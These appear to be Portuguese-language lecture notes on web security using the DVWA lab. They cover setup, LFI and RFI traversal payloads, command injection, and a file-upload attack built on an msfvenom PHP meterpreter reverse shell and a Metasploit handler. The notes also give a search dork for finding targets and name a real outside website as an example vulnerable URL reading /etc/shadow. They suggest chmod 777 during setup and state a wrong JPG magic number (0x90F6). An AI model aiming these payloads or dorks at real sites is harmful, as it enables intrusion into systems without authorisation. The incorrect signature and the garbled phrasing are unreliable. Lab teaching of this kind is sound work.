# üíª T√≥picos de Aula: Seguran√ßa Web e DVWA

---

## üìÖ Aula 23/10

### Ferramentas e Recursos de Estudo

* **Aplica√ß√£o de Teste:** DVWA - Damn Vulnerable Web Application (Instala√ß√£o e explora√ß√£o)
    * *Nota:* O conte√∫do das falhas e suas solu√ß√µes podem ser cobrados em provas.
* **Outras Ferramentas:**
    * Google Gruyere
    * bWAPP
    * Web Hacking - DVWA
    * Hack The Box
    * TryHackMe

---

### ‚öôÔ∏è Roteiro de Instala√ß√£o do DVWA

1.  `cd /var/www/html`
2.  `sudo sudo git clone https://github.com/digininja/DVWA.git`
3.  `sudo chmod -R 777 DVWA`
4.  `cd DVWA`
5.  `cd config`
6.  `cp config.inc.php.dist config.inc.php`
7.  Editar o `config.inc.php` (Alterar `db_user` e `db_password` para `dvwa` e `p@ssw0rd`).
8.  `cd /etc/php/{versao}/apache2`
9.  `sudo nano php.ini` ‚Üí Editar `php.ini` (`allow_url_include = On`)
10. `sudo apt install phpX.Y-gd`
11. `sudo service mysql start`
12. `sudo mysql -u root`
13. `create database dvwa;`
14. `create user dvwa@localhost identified by ‚Äúp@ssw0rd‚Äù;`
15. `grant all on dvwa.* to dvwa@localhost;`
16. `flush privileges;`
17. `sudo service apache2 start`
18. Acessar a URL: `http://127.0.0.1/DVWA`
19. Clicar em **create/reset Database**
20. Autenticar com as credenciais (`admin` + `password`)
21. Acessar a URL: `http://127.0.0.1/DVWA/security.php`
22. Definir: **Security Level** (conforme necess√°rio)

---

## üõ°Ô∏è Vulnerabilidades e Explora√ß√µes

### Vulnerability: File Inclusion (LFI - Local File Inclusion)

* Permite a inclus√£o de arquivo ao explorar o mecanismo *dynamic file inclusion* implementado na aplica√ß√£o alvo.
* Atacante pode passar qualquer valor para o par√¢metro da aplica√ß√£o alvo, pois a valida√ß√£o correta do valor informado n√£o √© feita.
* Pode causar vazamento de informa√ß√µes sens√≠veis (apresentar o conte√∫do de determinados arquivos).
* **Causa:** Uma p√°gina recebe o caminho para o arquivo a ser inclu√≠do, e essa entrada n√£o √© validada de forma correta, possibilitando a inje√ß√£o de caracteres de *Directory Traversal* (`../../`).
    * **Exemplo de Explora√ß√£o (Te√≥rica):** `http://127.0.0.1/lfi.php?page=../../../../../etc/passwd`
    * **Exemplo (DVWA):** `http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/etc/passwd`
* **Dica de Busca:** `inurl: page=` (Qualquer URL com `page=` pode ser um alvo).
    * *Exemplo de URL vulner√°vel:* `https://www.ravagedband.com/index.php?page=/etc/shadow`

### Vulnerability: Remote File Inclusion (RFI)

* √â o processo de inclus√£o de **arquivos remotos**, atrav√©s da explora√ß√£o de processos de inclus√£o vulner√°veis.
* **Causa:** A p√°gina recebe como entrada o caminho para o arquivo, e esta entrada n√£o √© validada, permitindo que uma **URL externa** seja injetada na aplica√ß√£o alvo.
    * **Exemplo de Explora√ß√£o (Te√≥rica):** `http://127.0.0.1/rfi.php?page=http://www.crime.com`
    * **Exemplo (DVWA):** `http://127.0.0.1/DVWA/vulnerabilities/fi/?page=https://www.tceto.tc.br/`

### Command Injection (Inje√ß√£o de Comando)

* A inje√ß√£o de comando √© um ataque onde o objetivo √© a **execu√ß√£o de comandos arbitr√°rios no sistema operacional** alvo por meio de um aplicativo vulner√°vel (ex: Java).
* √â poss√≠vel quando um aplicativo passa **dados n√£o seguros fornecidos pelo usu√°rio** (formul√°rios, cookies, cabe√ßalhos HTTP, etc.) para um *shell* do sistema.
* Os comandos s√£o geralmente executados com os privil√©gios do aplicativo vulner√°vel.

### Vulnerability: File Upload

* Vulnerabilidade presente em servi√ßos web que permitem **uploads negligentes de arquivos maliciosos**.
* O atacante poder√° enviar um arquivo contendo instru√ß√µes maliciosas diversas (ex.: *reverse shell* ou *bind shell*).
* **Acessando a URL de Upload:** `http://127.0.0.1/DVWA/hackable/uploads/dvwa-file-upload.php`
<img width="585" height="337" alt="image" src="https://github.com/user-attachments/assets/eb8e8cd6-9bf9-4f9c-bcfe-9cfc7571ea30" />

#### üõ†Ô∏è Explora√ß√£o de File Upload (Reverse Shell)

1.  **Cria√ß√£o do Payload Malicioso (Reverse Shell):**
    ```bash
    $ msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > dvwa-file-upload-2.php
    ```
2.  Remover o coment√°rio `/*` do in√≠cio do arquivo gerado.
3.  Fazer o **upload** do arquivo no DVWA.
4.  **Acessar a URL** do arquivo enviado para execu√ß√£o (Reverse Shell):
    ```
    [http://127.0.0.1/DVWA/hackable/uploads/dvwa-file-upload-2.php](http://127.0.0.1/DVWA/hackable/uploads/dvwa-file-upload-2.php)
    ```
<img width="604" height="314" alt="image" src="https://github.com/user-attachments/assets/30c703dd-734c-41be-8736-32c771e8b928" />

#### üåê Aguardando a Conex√£o de Retorno (Metasploit Handler)

1.  `$ msfconsole`
2.  `$ use exploit/multi/handler`
3.  `$ set payload php/meterpreter_reverse_tcp`
4.  `$ set LHOST 127.0.0.1`
5.  `$ set LPORT 4444`
6.  `$ exploit`
7.  Acessar a URL do arquivo enviado para *reverse shell* no DVWA (Passo 4 da se√ß√£o anterior).

#### üîç Verifica√ß√µes Frequentes em Uploads

Frequentemente, o valor do ataque verifica apenas:

* **Assinatura** (n√∫mero m√°gico) do arquivo enviado (ex: JPG = `0x90F6`);
* **Extens√£o** do arquivo enviado;
* **Tamanho** do arquivo;
* Ou **nenhuma verifica√ß√£o** √© feita.
<img width="608" height="404" alt="image" src="https://github.com/user-attachments/assets/7f344811-9f89-4a84-b75f-0ac08a755f26" />
